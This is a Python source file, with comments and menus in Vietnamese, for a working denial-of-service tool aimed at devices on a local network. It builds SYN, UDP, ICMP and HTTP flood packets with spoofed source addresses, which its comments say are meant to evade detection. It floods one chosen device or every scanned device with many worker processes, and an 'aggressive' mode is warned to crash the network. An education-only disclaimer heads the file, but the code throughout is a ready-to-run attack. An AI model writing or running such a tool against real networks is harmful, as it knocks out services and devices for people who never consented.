#!/usr/bin/env python3
"""
DDoS Module - Phiên bản tối ưu hóa
Thực hiện tấn công từ chối dịch vụ trên các thiết bị trong mạng LAN.
*** CẢNH BÁO: CHỈ SỬ DỤNG CHO MỤC ĐÍCH GIÁO DỤC VÀ NGHIÊN CỨU. ***
*** VIỆC SỬ DỤNG CÔNG CỤ NÀY TRÊN MẠNG MÀ BẠN KHÔNG CÓ QUYỀN LÀ BẤT HỢP PHÁP. ***
"""

import threading
import time, multiprocessing
import random
import socket
import queue
import logging
import json
import os
import signal
from concurrent.futures import ThreadPoolExecutor, as_completed
from scapy.all import Ether, IP, TCP, ARP, srp, sendp, UDP, ICMP
from typing import List, Dict, Optional, Tuple
from . import utils  # Import module utils
import ipaddress

# --- Worker Process Function (for multiprocessing) ---
# This function must be at the top level to be "picklable" by multiprocessing.

def _generate_spoofed_ip() -> str:
    """Tạo IP giả mạo."""
    # Tạo IP từ các range phổ biến để tránh bị phát hiện
    ranges = [
        (1, 254), (1, 254), (1, 254), (1, 254)  # Random
    ]
    # Đôi khi sử dụng IP từ các ISP lớn để tăng tính thực tế
    if random.random() < 0.3:
        ranges = [
            (8, 8), (8, 8), (1, 254), (1, 254)  # Google DNS
        ]
    return ".".join(str(random.randint(r[0], r[1])) for r in ranges)

def _create_packet_for_worker(attack_type: str, target_ip: str, target_mac: str, port: int) -> bytes:
    """Tạo gói tin tùy theo loại tấn công cho worker process."""
    src_ip = _generate_spoofed_ip()
    
    if attack_type == 'syn_flood':
        src_port = random.randint(1024, 65535)
        return bytes(Ether(dst=target_mac) / 
                    IP(src=src_ip, dst=target_ip) / 
                    TCP(sport=src_port, dport=port, flags="S"))
                    
    elif attack_type == 'udp_flood':
        src_port = random.randint(1024, 65535)
        # Sử dụng os.urandom thay vì random.randbytes để tương thích với mọi phiên bản Python
        payload = os.urandom(random.randint(1024, 4096))
        return bytes(Ether(dst=target_mac) / 
                    IP(src=src_ip, dst=target_ip) / 
                    UDP(sport=src_port, dport=port) / 
                    payload)
                    
    elif attack_type == 'icmp_flood':
        # Sử dụng os.urandom thay vì random.randbytes để tương thích với mọi phiên bản Python
        payload = os.urandom(random.randint(512, 2048))
        return bytes(Ether(dst=target_mac) / 
                    IP(src=src_ip, dst=target_ip) / 
                    ICMP() / payload)
                    
    elif attack_type == 'http_flood':
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ]
        http_payload = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {random.choice(user_agents)}\r\nConnection: keep-alive\r\n\r\n"
        src_port = random.randint(1024, 65535)
        return bytes(Ether(dst=target_mac) / 
                    IP(src=src_ip, dst=target_ip) / 
                    TCP(sport=src_port, dport=port, flags="PA") / 
                    http_payload.encode())

    # --- Thêm placeholder cho các loại tấn công chưa được triển khai ---
    elif attack_type == 'slowloris':
        # Logic cho Slowloris sẽ khác, cần tạo socket và giữ kết nối
        # Đây chỉ là placeholder, cần triển khai logic riêng
        raise NotImplementedError("Slowloris attack is not implemented in the worker process yet.")
    elif attack_type == 'amplification':
        raise NotImplementedError("Amplification attack is not implemented in the worker process yet.")
    # --------------------------------------------------------------------
    
    # Fallback for other types
    return bytes(Ether(dst=target_mac) / IP(src=src_ip, dst=target_ip) / ICMP())


def _worker_process(
    target_ip: str, 
    target_mac: str, 
    port: int, 
    attack_type: str, 
    stop_event: multiprocessing.Event, 
    stats_queue: multiprocessing.Queue,
    interface: str,
    packet_rate_per_process: int
):
    """
    Hàm worker được chạy bởi mỗi tiến trình con.
    Tạo và gửi gói tin liên tục.
    """
    packets_sent = 0
    errors = 0
    
    # Tính toán thời gian sleep để đạt được packet rate mong muốn
    sleep_interval = 0
    if packet_rate_per_process > 0:
        sleep_interval = 1.0 / packet_rate_per_process

    # Pre-select attack type if it's 'mixed'
    current_attack_type = attack_type
    if current_attack_type == 'mixed':
        attack_types = ['syn_flood', 'udp_flood', 'icmp_flood']
        current_attack_type = random.choice(attack_types)

    while not stop_event.is_set():
        try:
            packet = _create_packet_for_worker(current_attack_type, target_ip, target_mac, port)
            sendp(packet, iface=interface, verbose=0)
            packets_sent += 1

            # Gửi thống kê theo lô để giảm tải cho queue
            if packets_sent % 100 == 0:
                stats_queue.put({'packets': 100, 'errors': 0})
                packets_sent = 0 # Reset counter

            if sleep_interval > 0:
                time.sleep(sleep_interval)

        except Exception:
            errors += 1
    
    # Gửi nốt phần thống kê còn lại trước khi thoát
    if packets_sent > 0 or errors > 0:
        stats_queue.put({'packets': packets_sent, 'errors': errors})


class DDoSAttacker:
    """
    Lớp thực hiện tấn công DDoS tối ưu hóa với nhiều loại tấn công và cơ chế giám sát.
    """
    
    ATTACK_TYPES = {
        'syn_flood': 'TCP SYN Flood',
        'udp_flood': 'UDP Flood', 
        'icmp_flood': 'ICMP Flood',
        'mixed': 'Mixed Attack',
        'http_flood': 'HTTP Flood',
        'https_flood': 'HTTPS Flood',
        'ssl_flood': 'SSL/TLS Flood',
        'slowloris': 'Slowloris Attack',
        'amplification': 'DNS/NTP Amplification'
    }
    
    def __init__(self, attacker_ip: str, interface: str, 
                 port: int = 80, attack_type: str = 'syn_flood', 
                 spoof_ip: bool = True, threads_per_target: int = 10,
                 packet_rate: int = 5000, duration: Optional[int] = None,
                 debug: bool = False, skip_ping_check: bool = False,
                 aggressive: bool = False):
        """
        Khởi tạo attacker với các tham số tối ưu.
        
        :param attacker_ip: Địa chỉ IP của máy tấn công
        :param interface: Tên card mạng
        :param port: Cổng đích
        :param attack_type: Loại tấn công ('syn_flood', 'udp_flood', 'icmp_flood', 'mixed', 'http_flood', 'slowloris')
        :param spoof_ip: Có giả mạo IP không
        :param threads_per_target: Số tiến trình (worker) cho mỗi mục tiêu (mặc định: 10)
        :param packet_rate: Tốc độ gửi gói tin (packets/second, mặc định: 5000)
        :param duration: Thời gian tấn công (giây), None = vô hạn
        :param debug: Bật debug logging
        :param skip_ping_check: Bỏ qua kiểm tra ping
        :param aggressive: Chế độ tấn công cực mạnh (tăng threads và packet_rate)
        """
        self.attacker_ip = attacker_ip
        self.interface = interface
        self.port = port
        self.attack_type = attack_type
        self.spoof_ip = spoof_ip
        self.threads_per_target = threads_per_target
        self.packet_rate = packet_rate
        self.duration = duration
        self.debug = debug
        self.skip_ping_check = skip_ping_check
        self.aggressive = aggressive
        
        # Tăng cường độ nếu ở chế độ aggressive
        if self.aggressive:
            self.threads_per_target = 50  # Tăng gấp 5 lần
            self.packet_rate = 20000      # Tăng gấp 4 lần
            print(f"[!] CHẾ ĐỘ TẤN CÔNG CỰC MẠNH: {self.threads_per_target} threads/target, {self.packet_rate} pps")
        
        # Cơ chế điều khiển
        self.manager = multiprocessing.Manager()
        self.stop_event = multiprocessing.Event() # Sử dụng Event của multiprocessing, không phải của Manager
        self.resolved_targets: Dict[str, str] = {}
        self.processes: List[multiprocessing.Process] = []
        
        # Thống kê
        self.stats = self.manager.dict({
            'packets_sent': 0,
            'start_time': None,
            'targets_online': 0,
            'errors': 0
        })
        self.stats_lock = threading.Lock()
        
        # Queue để các worker gửi lại thống kê
        self.stats_queue = self.manager.Queue()
        
        # Lấy logger đã được cấu hình sẵn từ root
        self.logger = logging.getLogger(__name__)
    
    def select_single_target(self, available_targets: List[str]) -> Optional[str]:
        """
        Hiển thị menu chọn 1 mục tiêu cụ thể.
        
        :param available_targets: Danh sách các mục tiêu có sẵn
        :return: IP của mục tiêu được chọn
        """
        if not available_targets:
            self.logger.error("Không có mục tiêu nào để chọn.")
            return None
            
        print("\n=== CHỌN MỤC TIÊU TẤN CÔNG ===")
        print("0. Tấn công tất cả thiết bị")
        
        # Tải thông tin thiết bị để hiển thị
        devices_info = utils.load_device_database(self.logger)
            
        for i, ip in enumerate(available_targets, 1):
            device_info = devices_info.get(ip, {})
            hostname = device_info.get('hostname', 'Unknown')
            vendor = device_info.get('mac_vendor', device_info.get('vendor', 'Unknown'))
            os_info = device_info.get('os', 'Unknown')
            device_type = device_info.get('device_type', 'Unknown')
            risk_level = device_info.get('security_info', {}).get('risk_level', 'low')
            
            # Hiển thị thông tin chi tiết hơn
            print(f"{i}. {ip} - {hostname}")
            print(f"   📱 {vendor} | {os_info} | {device_type.title()} | Risk: {risk_level.upper()}")
        
        while True:
            try:
                choice = input("\nChọn mục tiêu (0-{}): ".format(len(available_targets)))
                choice = int(choice)
                
                if choice == 0:
                    return None  # Tấn công tất cả
                elif 1 <= choice <= len(available_targets):
                    selected_ip = available_targets[choice - 1]
                    self.logger.info(f"Đã chọn mục tiêu: {selected_ip}")
                    return selected_ip
                else:
                    print("Lựa chọn không hợp lệ. Vui lòng thử lại.")
            except ValueError:
                print("Vui lòng nhập số.")
            except KeyboardInterrupt:
                return None
    
    def set_targets(self, targets: List[str]):
        """
        Thiết lập danh sách mục tiêu.
        
        :param targets: Danh sách IP mục tiêu
        """
        self.targets = self._validate_targets(targets, self.attacker_ip)
        
    def _validate_targets(self, targets: List[str], attacker_ip: str) -> List[str]:
        """Xác thực và lọc danh sách mục tiêu."""
        valid_targets = []
        for ip in targets:
            if ip == attacker_ip:
                continue
            try:
                ipaddress.ip_address(ip)
                valid_targets.append(ip)
            except ValueError:
                self.logger.warning(f"IP không hợp lệ: {ip}")
        return valid_targets
    
    def _generate_spoofed_ip(self) -> str:
        """Tạo IP giả mạo thông minh hơn."""
        if not self.spoof_ip:
            return self.attacker_ip
            
        # Tạo IP từ các range phổ biến để tránh bị phát hiện
        ranges = [
            (1, 254), (1, 254), (1, 254), (1, 254)  # Random
        ]
        
        # Đôi khi sử dụng IP từ các ISP lớn để tăng tính thực tế
        if random.random() < 0.3:
            ranges = [
                (8, 8), (8, 8), (1, 254), (1, 254)  # Google DNS
            ]
            
        return ".".join(str(random.randint(r[0], r[1])) for r in ranges)
    
    def _check_network_connectivity(self, target_ip: str) -> bool:
        """Kiểm tra kết nối mạng đến mục tiêu."""
        try:
            # Thử ping đến target
            import subprocess
            result = subprocess.run(['ping', '-c', '1', '-W', '2', target_ip], 
                                  capture_output=True, text=True, timeout=5)
            return result.returncode == 0
        except Exception as e:
            self.logger.debug(f"Lỗi khi ping {target_ip}: {e}")
            return False
    
    def _resolve_targets_optimized(self) -> bool:
        """Phân giải MAC với timeout và retry tối ưu."""
        self.logger.info(f"Đang phân giải địa chỉ MAC của {len(self.targets)} mục tiêu...")
        
        if not self.targets:
            self.logger.warning("Không có mục tiêu nào để phân giải MAC.")
            return False
            
        device_db = utils.load_device_database(self.logger)
            
        try:
            # Sử dụng ThreadPoolExecutor để phân giải song song
            with ThreadPoolExecutor(max_workers=min(10, len(self.targets))) as executor:
                future_to_ip = {
                    executor.submit(self._resolve_single_target, ip, device_db): ip 
                    for ip in self.targets
                }
                
                resolved_count = 0
                for future in as_completed(future_to_ip, timeout=15):  # Tăng timeout lên 15 giây
                    ip = future_to_ip[future]
                    try:
                        mac = future.result()
                        if mac:
                            self.resolved_targets[ip] = mac
                            resolved_count += 1
                            self.logger.info(f"✓ Phân giải thành công: {ip} -> {mac}")
                        else:
                            self.logger.warning(f"✗ Không thể phân giải MAC: {ip}")
                    except Exception as e:
                        self.logger.error(f"✗ Lỗi phân giải {ip}: {e}")
                        
            self.stats['targets_online'] = len(self.resolved_targets)
            self.logger.info(f"Kết quả phân giải: {len(self.resolved_targets)}/{len(self.targets)} mục tiêu thành công.")
            
            if len(self.resolved_targets) == 0:
                self.logger.error("Không phân giải được MAC cho mục tiêu nào. Có thể:")
                self.logger.error("1. Thiết bị không online hoặc không phản hồi")
                self.logger.error("2. Firewall chặn ARP requests")
                self.logger.error("3. Interface mạng không đúng")
                self.logger.error(f"4. Cần quyền root để gửi ARP requests")
                return False
                
            return True
            
        except Exception as e:
            self.logger.error(f"Lỗi khi phân giải MAC: {e}")
            return False
    
    def _resolve_single_target(self, ip: str, device_db: Dict) -> Optional[str]:
        """Phân giải MAC cho một mục tiêu duy nhất, ưu tiên từ DB."""
        # 1. Ưu tiên lấy từ DB
        device_info = device_db.get(ip)
        if device_info and device_info.get('mac_address'):
            mac = device_info['mac_address']
            self.logger.debug(f"Tìm thấy MAC của {ip} trong DB: {mac}")
            return mac

        self.logger.debug(f"Không tìm thấy MAC của {ip} trong DB, đang gửi ARP request...")
        try:
            self.logger.debug(f"Đang phân giải MAC cho {ip}...")
            
            # Kiểm tra kết nối trước
            if not self.skip_ping_check and not self._check_network_connectivity(ip):
                self.logger.warning(f"Không thể ping đến {ip} - thiết bị có thể offline")
                return None
            
            # Tạo gói tin ARP request
            arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
            
            # Gửi ARP request và chờ phản hồi
            ans, unans = srp(arp_request, timeout=3, iface=self.interface, verbose=0)
            
            if ans:
                mac = ans[0][1].hwsrc
                self.logger.debug(f"Phân giải thành công {ip} -> {mac}")
                return mac
            else:
                self.logger.warning(f"Không nhận được phản hồi ARP từ {ip}")
                return None
                
        except Exception as e:
            self.logger.error(f"Lỗi khi phân giải MAC của {ip}: {e}")
            return None
    
    def _monitor_attack(self):
        """Giám sát và hiển thị thống kê tấn công."""
        while not self.stop_event.is_set():
            time.sleep(5)
            
            with self.stats_lock:
                elapsed = time.time() - self.stats['start_time'] if self.stats['start_time'] else 0
                
                # Lấy thống kê từ queue
                while not self.stats_queue.empty():
                    stat = self.stats_queue.get()
                    self.stats['packets_sent'] += stat.get('packets', 0)
                    self.stats['errors'] += stat.get('errors', 0)

                pps = self.stats['packets_sent'] / elapsed if elapsed > 0 else 0
                self.logger.info(
                    f"Thống kê: {self.stats['packets_sent']} gói tin, "
                    f"{pps:.1f} pps, {self.stats['errors']} lỗi, "
                    f"{self.stats['targets_online']} mục tiêu online"
                )
    
    def start_attack(self) -> bool:
        """Bắt đầu tấn công sử dụng multiprocessing."""
        if not self.targets:
            self.logger.error("Không có mục tiêu nào để tấn công.")
            return False
            
        # Phân giải MAC
        if not self._resolve_targets_optimized():
            self.logger.error("Không thể phân giải địa chỉ MAC cho bất kỳ mục tiêu nào.")
            return False
        
        self.logger.info(f"Chuẩn bị tấn công {len(self.resolved_targets)} thiết bị...")
        self.stop_event.clear()
        self.stats['start_time'] = time.time()
        
        # --- Xử lý tín hiệu để tắt an toàn ---
        # Thiết lập để các tiến trình con bỏ qua tín hiệu SIGINT (Ctrl+C).
        # Chỉ tiến trình chính sẽ xử lý nó một cách an toàn.
        original_sigint_handler = signal.signal(signal.SIGINT, signal.SIG_IGN)
        # ------------------------------------

        # Khởi động monitoring process
        monitor_process = multiprocessing.Process(target=self._monitor_attack, daemon=True)
        monitor_process.start()
        self.processes.append(monitor_process)
        
        # Tính toán packet rate cho mỗi process
        total_processes = len(self.resolved_targets) * self.threads_per_target
        packet_rate_per_process = self.packet_rate / total_processes if total_processes > 0 else 0

        # Khởi động attack processes
        for target_ip, target_mac in self.resolved_targets.items():
            for i in range(self.threads_per_target):
                process = multiprocessing.Process(
                    target=_worker_process, 
                    args=(
                        target_ip, target_mac, self.port, self.attack_type, 
                        self.stop_event, self.stats_queue, self.interface,
                        packet_rate_per_process
                    ),
                    daemon=True
                )
                self.processes.append(process)
                process.start()
                
        # --- Khôi phục xử lý tín hiệu cho tiến trình chính ---
        # Điều này cho phép Ctrl+C hoạt động bình thường trong vòng lặp chờ,
        # trong khi các tiến trình con vẫn bỏ qua nó.
        signal.signal(signal.SIGINT, original_sigint_handler)
        # -------------------------------------------------

        self.logger.info(f"Tấn công đã bắt đầu với {len(self.processes) - 1} tiến trình worker. Nhấn Ctrl+C để dừng.")
        return True
    
    def stop_attack(self):
        """Dừng tất cả các tiến trình tấn công."""
        self.logger.info("Đang dừng các tiến trình tấn công...")
        self.stop_event.set()
        
        # Đợi các tiến trình con kết thúc
        for process in self.processes:
            self.logger.info(f"Đang chờ tiến trình {process.name} (PID: {process.pid}) dừng...")
            process.join(timeout=2) # Cho 2 giây để tự dừng
            if process.is_alive():
                self.logger.warning(f"Tiến trình {process.name} không tự dừng, đang buộc dừng (terminate)...")
                process.terminate() # Buộc dừng nếu không tự thoát
                process.join() # Đợi sau khi terminate
            else:
                self.logger.info(f"Tiến trình {process.name} đã dừng thành công.")

        self.processes.clear()
        
        # Hiển thị thống kê cuối cùng
        # Lấy nốt thống kê còn lại trong queue
        while not self.stats_queue.empty():
            stat = self.stats_queue.get_nowait()
            self.stats['packets_sent'] += stat.get('packets', 0)
            self.stats['errors'] += stat.get('errors', 0)

        elapsed = time.time() - self.stats['start_time'] if self.stats['start_time'] else 0
        total_pps = self.stats['packets_sent'] / elapsed if elapsed > 0 else 0
        self.logger.info(
            f"Tấn công đã dừng. Tổng kết: {self.stats['packets_sent']} gói tin, "
            f"{total_pps:.1f} pps trung bình, {self.stats['errors']} lỗi"
        )
    
    def get_stats(self) -> Dict:
        """Lấy thống kê hiện tại."""
        return dict(self.stats)
    
    def is_attacking(self) -> bool:
        """Kiểm tra xem có đang tấn công không."""
        return not self.stop_event.is_set()

def run_ddos_attack(attacker_ip: str, interface: str, **kwargs):
    """
    Hàm tiện ích để chạy tấn công DDoS với menu lựa chọn.
    
    :param attacker_ip: IP của attacker
    :param interface: Interface mạng
    :param kwargs: Các tham số khác cho DDoSAttacker
    """
    # Kiểm tra quyền root
    import os
    if os.geteuid() != 0:
        print("[-] CẢNH BÁO: Cần quyền root để thực hiện tấn công DDoS.")
        print("[-] Vui lòng chạy lại với sudo.")
        return

    try:
        # --- BƯỚC 1: CHỌN PHƯƠNG THỨC TẤN CÔNG (SINGLE/MULTIPLE) ---
        print("\n=== DDoS ATTACK MODULE ===")
        print("1. Tấn công đồng loạt nhiều thiết bị")
        print("2. Tấn công 1 thiết bị cụ thể")
        
        method_choice = None
        while True:
            try:
                choice_str = input("\nChọn phương thức tấn công (1-2): ")
                method_choice = int(choice_str)
                if method_choice in [1, 2]:
                    break
                else:
                    print("Lựa chọn không hợp lệ. Vui lòng thử lại.")
            except ValueError:
                print("Vui lòng nhập số.")
    except KeyboardInterrupt:
        print("\n[*] Hủy tấn công.")
        return
    except Exception as e:
        logging.error(f"Lỗi không mong muốn trong DDoS: {e}")
        return
        
    # --- BƯỚC 2: CHỌN LOẠI TẤN CÔNG (SYN, UDP, etc.) ---

    # Tách các tham số đặc biệt
    debug = kwargs.pop('debug', False)
    skip_ping = kwargs.pop('skip_ping_check', False)
    
    # Hiển thị menu chọn loại tấn công
    print("\n=== CHỌN LOẠI TẤN CÔNG ===")
    attack_types = list(DDoSAttacker.ATTACK_TYPES.keys())
    for i, attack_type in enumerate(attack_types, 1):
        print(f"{i}. {DDoSAttacker.ATTACK_TYPES[attack_type]}")
    
    while True:
        try:
            attack_choice = input(f"\nChọn loại tấn công (1-{len(attack_types)}): ")
            attack_choice = int(attack_choice)
            if 1 <= attack_choice <= len(attack_types):
                selected_attack = attack_types[attack_choice - 1]
                print(f"[+] Đã chọn: {DDoSAttacker.ATTACK_TYPES[selected_attack]}")
                break
            else:
                print("Lựa chọn không hợp lệ. Vui lòng thử lại.")
        except ValueError:
            print("Vui lòng nhập số.")
        except KeyboardInterrupt:
            return
    
    # Chọn port cho tấn công
    print("\n=== CHỌN CỔNG TẤN CÔNG ===")
    if selected_attack in ['http_flood', 'https_flood', 'ssl_flood']:
        if selected_attack == 'http_flood':
            print("1. HTTP (Port 80)")
            print("2. HTTPS (Port 443)")
            print("3. Port tùy chỉnh")
        elif selected_attack == 'https_flood':
            print("1. HTTPS (Port 443)")
            print("2. HTTP (Port 80)")
            print("3. Port tùy chỉnh")
        else:  # ssl_flood
            print("1. SSL/TLS (Port 443)")
            print("2. SSL/TLS (Port 8443)")
            print("3. Port tùy chỉnh")
        
        while True:
            try:
                port_choice = input("\nChọn cổng (1-3): ")
                port_choice = int(port_choice)
                if port_choice == 1:
                    if selected_attack == 'http_flood':
                        selected_port = 80
                        print("[+] Đã chọn: HTTP (Port 80)")
                    elif selected_attack == 'https_flood':
                        selected_port = 443
                        print("[+] Đã chọn: HTTPS (Port 443)")
                    else:  # ssl_flood
                        selected_port = 443
                        print("[+] Đã chọn: SSL/TLS (Port 443)")
                    break
                elif port_choice == 2:
                    if selected_attack == 'http_flood':
                        selected_port = 443
                        print("[+] Đã chọn: HTTPS (Port 443)")
                    elif selected_attack == 'https_flood':
                        selected_port = 80
                        print("[+] Đã chọn: HTTP (Port 80)")
                    else:  # ssl_flood
                        selected_port = 8443
                        print("[+] Đã chọn: SSL/TLS (Port 8443)")
                    break
                elif port_choice == 3:
                    while True:
                        try:
                            custom_port = input("Nhập port tùy chỉnh (1-65535): ")
                            selected_port = int(custom_port)
                            if 1 <= selected_port <= 65535:
                                print(f"[+] Đã chọn: Port {selected_port}")
                                break
                            else:
                                print("Port phải từ 1-65535. Vui lòng thử lại.")
                        except ValueError:
                            print("Vui lòng nhập số.")
                    break
                else:
                    print("Lựa chọn không hợp lệ. Vui lòng thử lại.")
            except ValueError:
                print("Vui lòng nhập số.")
            except KeyboardInterrupt:
                return
    else:
        # Port mặc định cho các loại tấn công khác
        selected_port = kwargs.get('port', 80)
        print(f"[+] Sử dụng port mặc định: {selected_port}")
    
    # Hỏi về chế độ aggressive
    print("\n=== CHẾ ĐỘ TẤN CÔNG ===")
    print("1. Tấn công bình thường")
    print("2. Tấn công cực mạnh (⚠️ CẢNH BÁO: Có thể gây sập mạng!)")
    
    while True:
        try:
            mode_choice = input("\nChọn chế độ tấn công (1-2): ")
            mode_choice = int(mode_choice)
            if mode_choice == 1:
                aggressive = False
                print("[+] Chế độ tấn công bình thường")
                break
            elif mode_choice == 2:
                aggressive = True
                print("[!] ⚠️ CHẾ ĐỘ TẤN CÔNG CỰC MẠNH ĐÃ ĐƯỢC KÍCH HOẠT!")
                print("[!] Có thể gây sập mạng và thiết bị!")
                confirm = input("Bạn có chắc chắn muốn tiếp tục? (y/N): ")
                if confirm.lower() != 'y':
                    print("[*] Hủy tấn công.")
                    return
                break
            else:
                print("Lựa chọn không hợp lệ. Vui lòng thử lại.")
        except ValueError:
            print("Vui lòng nhập số.")
        except KeyboardInterrupt:
            return
    
    # --- BƯỚC 5: KHỞI TẠO VÀ CHẠY TẤN CÔNG ---
    kwargs.pop('port', None) # Loại bỏ port khỏi kwargs để tránh conflict
    attacker = DDoSAttacker(attacker_ip, interface, 
                           attack_type=selected_attack,
                           port=selected_port,
                           debug=debug, skip_ping_check=skip_ping, 
                           aggressive=aggressive, **kwargs)

    if method_choice == 1:
        # Tấn công đồng loạt
        print("\n[*] Tấn công đồng loạt nhiều thiết bị...")
        targets = utils.load_targets_from_scan(attacker.logger, attacker.attacker_ip, exclude_router=True, exclude_attacker=True)
        if not targets:
            print("[-] Không có mục tiêu nào để tấn công.")
            print("[-] Vui lòng chạy 'scan' trước để quét mạng.")
            return
        attacker.set_targets(targets)
        print(f"[+] Sẽ tấn công {len(targets)} thiết bị với {DDoSAttacker.ATTACK_TYPES[selected_attack]}")
    
    elif method_choice == 2:
        # Tấn công 1 thiết bị
        print("\n[*] Tấn công 1 thiết bị cụ thể...")
        available_targets = utils.load_targets_from_scan(attacker.logger, attacker.attacker_ip, exclude_router=True, exclude_attacker=True)
        if not available_targets:
            print("[-] Không có mục tiêu nào để chọn.")
            print("[-] Vui lòng chạy 'scan' trước để quét mạng.")
            return
        selected_target = attacker.select_single_target(available_targets)
        if selected_target is None:
            print("[-] Không chọn mục tiêu nào. Hủy tấn công.")
            return
        attacker.set_targets([selected_target])
        print(f"[+] Sẽ tấn công thiết bị: {selected_target} với {DDoSAttacker.ATTACK_TYPES[selected_attack]}")

    # Bắt đầu tấn công
    if attacker.start_attack():
        try:
            while attacker.is_attacking():
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[*] Người dùng yêu cầu dừng...")
            attacker.stop_attack()
    else:
        print("[-] Không thể bắt đầu tấn công.")
        print("[-] Kiểm tra lại:")
        print("   1. Quyền root (sudo)")
        print("   2. Interface mạng đúng")
        print("   3. Thiết bị mục tiêu online")


if __name__ == '__main__':
    # Cần thiết cho multiprocessing trên một số hệ điều hành (Windows, macOS)
    multiprocessing.freeze_support()